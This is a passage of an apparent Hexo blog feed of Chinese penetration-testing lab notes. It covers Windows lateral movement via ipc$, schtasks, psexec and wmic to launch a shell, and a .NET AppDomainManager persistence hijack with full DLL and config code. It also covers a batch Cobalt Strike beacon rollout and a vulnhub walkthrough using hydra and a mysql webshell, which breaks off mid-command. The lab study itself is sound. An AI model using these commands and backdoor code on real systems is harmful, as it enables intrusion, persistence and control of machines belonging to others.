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</div><script src="/lib/crypto-js.js"></script><script src="/lib/blog-encrypt.js"></script><link href="/css/blog-encrypt.css" rel="stylesheet" type="text/css">]]></content>
      
      
        <tags>
            
            <tag> writing </tag>
            
        </tags>
      
    </entry>
    
    <entry>
      <title>内网下常见的反弹shell</title>
      <link href="/posts/c0872ef5.html"/>
      <url>/posts/c0872ef5.html</url>
      <content type="html"><![CDATA[<h2 id="内网下常见的反弹shell"><a href="#内网下常见的反弹shell" class="headerlink" title="内网下常见的反弹shell"></a>内网下常见的反弹shell</h2><p><img src="https://timgsa.baidu.com/timg?image&amp;quality=80&amp;size=b9999_10000&amp;sec=1579494134917&amp;di=e8ca9fee1e4b883d51d788c0578e82ba&amp;imgtype=0&amp;src=http%3A%2F%2Fi2.17173cdn.com%2F2fhnvk%2FYWxqaGBf%2Fcms3%2FwhnhwXbkzetmCjm.jpg" alt=""></p><p>在公众号上看到的文章，以前看过。没实验过，算是填坑吧</p><h2 id="环境"><a href="#环境" class="headerlink" title="环境"></a>环境</h2><p>要求：知道管理员凭证</p><pre><code>windows server 2008:192.168.241.172widnows server 2008 2:192.168.241.171kali:192.168.241.174</code></pre><h2 id="老年ipc"><a href="#老年ipc" class="headerlink" title="老年ipc$"></a>老年ipc$</h2><p>建立连接</p><pre><code>net use \\&lt;IP&gt;\ipc$ /user:administrator &quot;&lt;password&gt;</code></pre><p><img src="https://s2.ax1x.com/2020/01/20/1PYJ2Q.png" alt=""></p><p>复制shell到目标机</p><pre><code>copy shell.exe \\&lt;IP&gt;\C$\windows\Temp\xxx.exe</code></pre><p><img src="https://s2.ax1x.com/2020/01/20/1PYwV0.png" alt=""></p><p>创建服务并运行</p><pre><code>schtasks /create /tn &quot;plugin_update&quot; /tr C:\Windows\Temp\xxx.exe /sc one /st &lt;time&gt; /S &lt;IP&gt; /RU Systemschtasks /run /tn &quot;plugin_update&quot; /S &lt;IP&gt;</code></pre><p><img src="https://s2.ax1x.com/2020/01/20/1PYgM9.png" alt=""></p><p><img src="https://s2.ax1x.com/2020/01/20/1PYha6.png" alt=""></p><p>反弹到的meterpreter<br><img src="https://s2.ax1x.com/2020/01/20/1PY7xH.png" alt=""></p><p>执行完之后删除任务</p><pre><code>schtasks /delete /tn &quot;plugin_update&quot; /S &lt;IP&gt;</code></pre><p><img src="https://s2.ax1x.com/2020/01/20/1PYqsA.png" alt=""></p><h2 id="psexec"><a href="#psexec" class="headerlink" title="psexec"></a>psexec</h2><pre><code>psexec \\&lt;IP&gt; -u &lt;username&gt; -p &lt;password&gt; &lt;command&gt; #执行命令等待进程终止，并返回结果psexec -accepteula \\&lt;IP&gt; -d -u &lt;username&gt; -p &lt;password&gt; &lt;command&gt; #执行命令不过等结果，无交互accepteula:此标志禁止显示“许可证”对话框-d:不要等待进程终止（非交互式）</code></pre><p><img src="https://s2.ax1x.com/2020/01/20/1PtMQJ.png" alt=""></p><p>无交互式不回显<br><img src="https://s2.ax1x.com/2020/01/20/1PtlLR.png" alt=""></p><h2 id="wmic-非交互式"><a href="#wmic-非交互式" class="headerlink" title="wmic (非交互式)"></a>wmic (非交互式)</h2><pre><code>wmic /node:&lt;IP&gt; /user:&lt;username&gt; /password:&lt;password&gt; process call create &lt;command&gt;</code></pre><p><img src="https://s2.ax1x.com/2020/01/20/1Pt5mn.png" alt=""></p>]]></content>
      
      
        <tags>
            
            <tag> Warring </tag>
            
        </tags>
      
    </entry>
    
    <entry>
      <title>.NET程序劫持</title>
      <link href="/posts/576bc259.html"/>
      <url>/posts/576bc259.html</url>
      <content type="html"><![CDATA[<h2 id="0x00前言"><a href="#0x00前言" class="headerlink" title="0x00前言"></a>0x00前言</h2><p>翻了翻收集的资源，打算学习一波。翻到三好学生的.NET劫持操作，复现一波<br><img src="https://timgsa.baidu.com/timg?image&amp;quality=80&amp;size=b9999_10000&amp;sec=1578931405684&amp;di=878960c7f869a877008253f25bad9396&amp;imgtype=0&amp;src=http%3A%2F%2Fb-ssl.duitang.com%2Fuploads%2Fitem%2F201608%2F28%2F20160828175529_vVwaM.png" alt=""></p><h2 id="0x01实验过程"><a href="#0x01实验过程" class="headerlink" title="0x01实验过程"></a>0x01实验过程</h2><p>创建一个简单的C#程序</p><pre><code class="C#">using System;public class Program{    public static void Main()    {        Console.WriteLine(&quot;Inside the App&quot;);    }}</code></pre><p>输出如下<br><img src="https://s2.ax1x.com/2020/01/13/lHhc0x.png" alt=""></p><p>创建一个名为hijack.dll的dll</p><pre><code class="C#">using System;using System.Text;using System.Diagnostics;using System.Runtime.InteropServices;using System.IO;using System.Reflection;using System.Runtime.Hosting;using System.Dynamic;namespace hijack{    public class cmd {        private static string CmdPath = @&quot;C:\Windows\System32\cmd.exe&quot;;        /// &lt;summary&gt;        /// 执行cmd命令 返回cmd窗口显示的信息        /// 多命令请使用批处理命令连接符：        /// &lt;![CDATA[        /// &amp;:同时执行两个命令        /// |:将上一个命令的输出,作为下一个命令的输入        /// &amp;&amp;：当&amp;&amp;前的命令成功时,才执行&amp;&amp;后的命令        /// ||：当||前的命令失败时,才执行||后的命令]]&gt;        /// &lt;/summary&gt;        /// &lt;param name=&quot;cmd&quot;&gt;执行的命令&lt;/param&gt;        public string RunCmd(string cmd)        {            cmd = cmd.Trim().TrimEnd(&#39;&amp;&#39;) + &quot;&amp;exit&quot;;//说明：不管命令是否成功均执行exit命令，否则当调用ReadToEnd()方法时，会处于假死状态            using (Process p = new Process())            {                p.StartInfo.FileName = CmdPath;                p.StartInfo.UseShellExecute = false;        //是否使用操作系统shell启动                p.StartInfo.RedirectStandardInput = true;   //接受来自调用程序的输入信息                p.StartInfo.RedirectStandardOutput = true;  //由调用程序获取输出信息                p.StartInfo.RedirectStandardError = true;   //重定向标准错误输出                p.StartInfo.CreateNoWindow = true;          //不显示程序窗口                p.Start();//启动程序                //向cmd窗口写入命令                p.StandardInput.WriteLine(cmd);                p.StandardInput.AutoFlush = true;                //获取cmd窗口的输出信息                string output = p.StandardOutput.ReadToEnd();                p.WaitForExit();//等待程序执行完退出进程                p.Close();                return output;            }        }    }    public class InjectedDomainManager : AppDomainManager    {        public override void InitializeNewDomain(AppDomainSetup appDomainInfo)        {            base.InitializeNewDomain(appDomainInfo);            cmd f = new cmd();            f.RunCmd(&quot;calc.exe&quot;);        }    }}</code></pre><p>修改yuan.exe.config为如下</p><pre><code class="text">&lt;?xml version=&quot;1.0&quot; encoding=&quot;utf-8&quot; ?&gt;&lt;configuration&gt;    &lt;startup&gt;         &lt;supportedRuntime version=&quot;v4.0&quot; sku=&quot;.NETFramework,Version=v4.5.2&quot; /&gt;    &lt;/startup&gt;     &lt;runtime&gt;      &lt;appDomainManagerType value=&quot;hijack.InjectedDomainManager&quot; /&gt;      &lt;appDomainManagerAssembly         value=&quot;hijack, Version=1.0.0.0, Culture=neutral, PublicKeyToken=null&quot; /&gt;    &lt;/runtime&gt;&lt;/configuration&gt;</code></pre><p>之后hijack.dll运行在yuan.exe前面<br><img src="https://s2.ax1x.com/2020/01/13/lH4Z34.gif" alt=""></p><p><strong>尝试劫持C:\Windows\system32\WindowsPowerShell\v1.0\powershell_ise.exe</strong><br>创建powershell_ise.exe.config</p><pre><code class="text">&lt;?xml version=&quot;1.0&quot; encoding=&quot;utf-8&quot; ?&gt;&lt;configuration&gt;    &lt;startup&gt;         &lt;supportedRuntime version=&quot;v4.0&quot; sku=&quot;.NETFramework,Version=v4.5.2&quot; /&gt;    &lt;/startup&gt;     &lt;runtime&gt;      &lt;appDomainManagerType value=&quot;hijack.InjectedDomainManager&quot; /&gt;      &lt;appDomainManagerAssembly         value=&quot;hijack, Version=1.0.0.0, Culture=neutral, PublicKeyToken=null&quot; /&gt;    &lt;/runtime&gt;&lt;/configuration&gt;</code></pre><p><img src="https://s2.ax1x.com/2020/01/13/lH5IeI.gif" alt=""></p><p>还有一个操作就是修改Vs创建C#工程时的默认App.config</p><pre><code class="text">&lt;?xml version=&quot;1.0&quot; encoding=&quot;utf-8&quot; ?&gt;&lt;configuration&gt;    &lt;startup&gt;         &lt;supportedRuntime version=&quot;v4.0&quot; sku=&quot;.NETFramework,Version=v4.5.2&quot; /&gt;    &lt;/startup&gt;     &lt;runtime&gt;      &lt;appDomainManagerType value=&quot;hijack.InjectedDomainManager&quot; /&gt;      &lt;appDomainManagerAssembly         value=&quot;hijack, Version=1.0.0.0, Culture=neutral, PublicKeyToken=null&quot; /&gt;    &lt;/runtime&gt;&lt;/configuration&gt;</code></pre><p>编译的时候exe的config也会跟着改变<br><img src="https://s2.ax1x.com/2020/01/13/lHIB9S.png" alt=""></p><p><img src="https://s2.ax1x.com/2020/01/13/lHoZ8S.gif" alt=""></p><h2 id="参考链接"><a href="#参考链接" class="headerlink" title="参考链接"></a>参考链接</h2><p><a href="https://3gstudent.github.io/3gstudent.github.io/Use-AppDomainManager-to-maintain-persistence/" target="_blank" rel="noopener">Use AppDomainManager to maintain persistence – 3gstudent – Good in study, attitude and health</a></p>]]></content>
      
      
        <tags>
            
            <tag> 后门 </tag>
            
        </tags>
      
    </entry>
    
    <entry>
      <title>cobal strike内网批量上线</title>
      <link href="/posts/b9889b8f.html"/>
      <url>/posts/b9889b8f.html</url>
      <content type="html"><![CDATA[<h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p>晚上临睡之前，发现一篇教cs批量上线的博客。看的不错，手动重演了一遍<br><img src="https://timgsa.baidu.com/timg?image&amp;quality=80&amp;size=b9999_10000&amp;sec=1578283165678&amp;di=951ef97bc927669d5027bfc448699a57&amp;imgtype=0&amp;src=http%3A%2F%2Fb-ssl.duitang.com%2Fuploads%2Fitem%2F201802%2F15%2F20180215122832_A4T5H.jpeg" alt="timg?image&amp;quality=80&amp;size=b9999_10000&amp;sec=1578283165678&amp;di=951ef97bc927669d5027bfc448699a57&amp;imgtype=0&amp;src=http%3A%2F%2Fb-ssl.duitang.com%2Fuploads%2Fitem%2F201802%2F15%2F20180215122832_A4T5H.jpeg"></p><h2 id="环境"><a href="#环境" class="headerlink" title="环境"></a>环境</h2><p>环境：</p><pre><code>windows 2008:192.168.241.171windows 2008 x2:192.168.241.172windows 7:192.168.241.156</code></pre><h2 id="内网可出网"><a href="#内网可出网" class="headerlink" title="内网可出网"></a>内网可出网</h2><p>首先windows7上线了，执行一波portscan<br><img src="https://s2.ax1x.com/2020/01/06/lrBiFK.png" alt="lrBiFK.png"></p><p>点击视图-&gt;目标可以看到扫出来开发的机子<br><img src="https://s2.ax1x.com/2020/01/06/lrBeOA.png" alt="lrBeOA.png"></p><p>获取登录密码通过cs自带的psexec执行ipc$批量<br><img src="https://s2.ax1x.com/2020/01/06/lrBaT0.png" alt="lrBaT0.png"></p><p>选中要进行测试的机子<br><img src="https://s2.ax1x.com/2020/01/06/lrB0YT.png" alt="lrB0YT.png"></p><p>选择对应的凭证<br><img src="https://s2.ax1x.com/2020/01/06/lrBXAP.png" alt="lrBXAP.png"></p><p>选择会话（补图）<br><img src="https://s2.ax1x.com/2020/01/06/lrDiBn.png" alt="lrDiBn.png"></p><p>等上线就好<br><img src="https://s2.ax1x.com/2020/01/06/lrDWuj.png" alt="lrDWuj.png"></p><h2 id="内网不可出网"><a href="#内网不可出网" class="headerlink" title="内网不可出网"></a>内网不可出网</h2><p>先将可出网的一台机设置中转<br><img src="https://s2.ax1x.com/2020/01/06/lrreat.png" alt="lrreat.png"></p><p><img src="https://s2.ax1x.com/2020/01/06/lrrKG8.png" alt="lrrKG8.png"></p><p>生成马子，把马子和PsExec传到出网的机子上，之后用PsExec执行命令</p><pre><code>PsExec.exe -accepteula \\192.168.241.171,192.168.241.172 -u Administrator -p xxxxx -d -c C:\Windows\Temp\beacon.exe</code></pre><p><img src="https://s2.ax1x.com/2020/01/06/lrrDsJ.png" alt="lrrDsJ.png"></p><p>等上线<br><img src="https://s2.ax1x.com/2020/01/06/lrr2i6.png" alt="lrr2i6.png"></p><p>在上线成功的机子上可以看到是通过192.168.241.156这台机的4444端口流量出网的<br><img src="https://s2.ax1x.com/2020/01/06/lrr4Qe.png" alt="lrr4Qe.png"></p><p>ssh批量登录的方法和图1差不多</p><h2 id="参考链接"><a href="#参考链接" class="headerlink" title="参考链接"></a>参考链接</h2><p><a href="https://payloads.cn/2019/1213/cobaltstrike-advancedbatch-launch.html" target="_blank" rel="noopener">CobaltStrike进阶篇-批量上线 | AnonySec’Blog</a></p>]]></content>
      
      
        <tags>
            
            <tag> Writing </tag>
            
        </tags>
      
    </entry>
    
    <entry>
      <title>vulnhub sunset:sunrise</title>
      <link href="/posts/c71a0647.html"/>
      <url>/posts/c71a0647.html</url>
      <content type="html"><![CDATA[<h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p>是时候水篇博客了，打开vulnhub。找个靶机练练手- -<br><img src="https://s2.ax1x.com/2020/01/02/lY6ng0.png" alt="lY6ng0.png"></p><h2 id="用到的方法"><a href="#用到的方法" class="headerlink" title="用到的方法"></a>用到的方法</h2><ul><li>nmap scan port</li><li>hydra爆破</li><li>mysql into outfile写shell</li><li>sudo -l提权</li></ul><h2 id="过程"><a href="#过程" class="headerlink" title="过程"></a>过程</h2><pre><code>fping -ag 192.168.241.0/24 &gt; zz.txt</code></pre><p><img src="https://s2.ax1x.com/2020/01/02/lY6c8I.png" alt="lY6c8I.png"></p><p>确定靶机ip为192.168.241.169</p><pre><code>nmap -Pn -sV 192.168.241.169</code></pre><p><img src="https://s2.ax1x.com/2020/01/02/lY67Ps.png" alt="lY67Ps.png"></p><p>80打开Apache默认页面<br><img src="https://s2.ax1x.com/2020/01/02/lYcixx.png" alt="lYcixx.png"></p><p>8080显示了几个路径（test.php是我的shell）<br><img src="https://s2.ax1x.com/2020/01/02/lYc2FJ.png" alt="lYc2FJ.png"></p><p>图片全部脱下来binwalk没啥特殊的全部删了<br><img src="https://s2.ax1x.com/2020/01/02/lYcvlt.md.png" alt="lYcvlt.md.png"></p><p>其他路径<br><img src="https://s2.ax1x.com/2020/01/02/lYgpm8.png" alt="lYgpm8.png"></p><p>dirb跑了没结果<br><img src="https://s2.ax1x.com/2020/01/02/lYgltJ.png" alt="lYgltJ.png"></p><p>hydra爆破ftp、爆破mysql。结果mysql爆破成功了<br><img src="https://s2.ax1x.com/2020/01/02/lYgjN4.png" alt="lYgjN4.png"></p><p>mysql连上，先翻了一波数据库啥都没有<br><img src="https://s2.ax1x.com/2020/01/02/lY2V4H.png" alt="lY2V4H.png"></p><p>页面提示了web路径为/var/tmp，那就写shell吧<br><img src="https://s2.ax1x.com/2020/01/02/lY2N2n.png" alt="lY2N2n.png"></p><pre><code>select 